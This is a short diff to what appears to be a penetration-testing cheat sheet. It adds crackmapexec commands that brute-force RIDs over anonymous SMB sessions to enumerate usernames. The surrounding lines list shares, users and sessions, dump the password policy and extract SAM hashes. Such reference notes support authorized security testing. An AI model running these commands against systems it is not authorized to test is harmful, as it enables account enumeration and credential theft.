@@ -945,6 +945,7 @@ crackmapexec smb <IP/range>
 crackmapexec smb 192.168.1.100 -u username -p password
 crackmapexec smb 192.168.1.100 -u username -p password --shares #lists available shares
 crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
+crackmapexec smb 192.168.1.100 -u 'anonymous' -p '' --rid-brute # Bruteforce to get the usernames
 crackmapexec smb 192.168.1.100 -u username -p password --all #all information
 crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares #specific port
 crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
@@ -3450,6 +3451,7 @@ cat /tmp/cme_spider_plus/10.10.11.187.json | jq ' . | map_values(keys) ' # List 
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks
 crackmapexec smb <DC-IP> -u 'user' -p 'password' --users #we need to provide DC ip
+crackmapexec smb <DC-IP> -u 'anonymous' -p '' --rid-brute  # Bruteforce to get the Usernames
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions #active logon sessions
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dumps password policy
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam #SAM hashes
